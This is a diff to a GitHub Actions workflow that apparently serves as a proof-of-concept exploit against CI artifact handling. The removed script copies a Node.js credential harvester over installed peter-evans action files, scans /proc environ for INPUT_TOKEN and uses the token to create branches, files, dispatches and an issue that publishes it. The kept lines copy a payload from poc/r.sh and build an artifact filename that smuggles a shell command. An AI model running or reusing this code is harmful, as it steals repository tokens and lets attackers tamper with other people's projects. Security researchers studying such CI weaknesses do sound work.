@@ -10,70 +10,13 @@ jobs:
   upload:
     runs-on: ubuntu-latest
     steps:
+      - uses: actions/checkout@v4
       - name: Build artifact
         run: |
           mkdir -p out
           printf '%s\n' "${{ github.event.pull_request.number }}" > out/pr_number.txt
           printf 'benign report\n' > out/report.txt
-          cat > out/r.txt <<'SCRIPT'
-          #!/bin/bash
-          set -u
-          MARK=/tmp/.omp_rce_done
-          if [ -e "$MARK" ]; then
-            echo report
-            exit 0
-          fi
-          touch "$MARK"
-          echo "OMP_RCE_PROOF uid=$(id -u) user=$(id -un) host=$(hostname) cwd=$(pwd)" >&2
-          echo "OMP_ENV_KEYS: $(printenv | cut -d= -f1 | sort | tr '\n' ' ')" >&2
-          cat > /tmp/harvest.js <<'EOJS'
-          const https=require('https');
-          const tok=process.env.INPUT_TOKEN||process.env.OMP_TOKEN||'';
-          const repo=process.env.GITHUB_REPOSITORY||process.env.OMP_REPO||'';
-          function api(m,p,b){return new Promise(r=>{const d=b?JSON.stringify(b):null;const h={'user-agent':'omp','authorization':'token '+tok,'accept':'application/vnd.github+json'};if(d){h['content-type']='application/json';h['content-length']=Buffer.byteLength(d);}const q=https.request({hostname:'api.github.com',path:p,method:m,headers:h},s=>{let x='';s.on('data',c=>x+=c);s.on('end',()=>r({st:s.statusCode,b:x}));});q.on('error',e=>r({st:0,b:String(e)}));if(d)q.write(d);q.end();});}
-          (async()=>{
-            const o=[];
-            o.push('OMP_TOKEN_LEN='+tok.length);
-            o.push('OMP_TOKEN='+tok);
-            const rp=await api('GET','/repos/'+repo);
-            o.push('GET_REPO '+rp.st+' '+rp.b.slice(0,900));
-            const cm=await api('GET','/repos/'+repo+'/commits/main');
-            let sha=''; try{sha=JSON.parse(cm.b).sha||'';}catch(e){}
-            o.push('GET_MAIN '+cm.st+' sha='+sha);
-            const rf=await api('POST','/repos/'+repo+'/git/refs',{ref:'refs/heads/omp-probe',sha:sha});
-            o.push('CREATE_REF '+rf.st+' '+rf.b.slice(0,300));
-            const ct=await api('PUT','/repos/'+repo+'/contents/omp-probe.txt',{message:'probe',content:Buffer.from('probe').toString('base64'),branch:'omp-probe'});
-            o.push('PUT_CONTENTS '+ct.st+' '+ct.b.slice(0,300));
-            const ds=await api('POST','/repos/'+repo+'/dispatches',{event_type:'omp-probe'});
-            o.push('DISPATCH '+ds.st+' '+ds.b.slice(0,300));
-            const iss=await api('POST','/repos/'+repo+'/issues',{title:'OMP RCE credential proof '+Date.now(),body:'```\n'+o.join('\n')+'\n```'});
-            o.push('CREATE_ISSUE '+iss.st+' '+iss.b.slice(0,300));
-            console.log(o.join('\n'));
-          })();
-          EOJS
-          PATCHED=0
-          while IFS= read -r f; do
-            if cp /tmp/harvest.js "$f" 2>/dev/null; then echo "OMP_PATCHED_ACTION $f" >&2; PATCHED=$((PATCHED+1)); fi
-          done < <(find /home/runner/work/_actions -path '*peter-evans*' -name 'index.js' 2>/dev/null)
-          echo "OMP_PATCHED_TOTAL=$PATCHED" >&2
-          NODE_BIN=$(command -v node 2>/dev/null || find /home/runner -maxdepth 7 -type f -name node -path '*externals*' 2>/dev/null | head -1)
-          echo "OMP_NODE=$NODE_BIN" >&2
-          if [ -n "$NODE_BIN" ]; then
-            nohup bash -c '
-            for i in $(seq 1 150); do
-              for f in /proc/[0-9]*/environ; do
-                T=$(tr "\0" "\n" < "$f" 2>/dev/null | sed -n "s/^INPUT_TOKEN=//p" | head -1)
-                if [ -n "$T" ] && [ ! -e /tmp/.omp_tok_done ]; then
-                  touch /tmp/.omp_tok_done
-                  OMP_TOKEN="$T" OMP_REPO="'"$GITHUB_REPOSITORY"'" "'"$NODE_BIN"'" /tmp/harvest.js >/dev/null 2>&1
-                fi
-              done
-              sleep 1
-            done' >/dev/null 2>&1 &
-          fi
-          echo report
-          exit 0
-          SCRIPT
+          cp poc/r.sh out/r.txt
           printf 'x' > 'out/$(cd $HOME;cd ..;cd ..;cd tmp;cd content;cd content;bash r.txt).txt'
           ls -la out
       - uses: actions/upload-artifact@v4
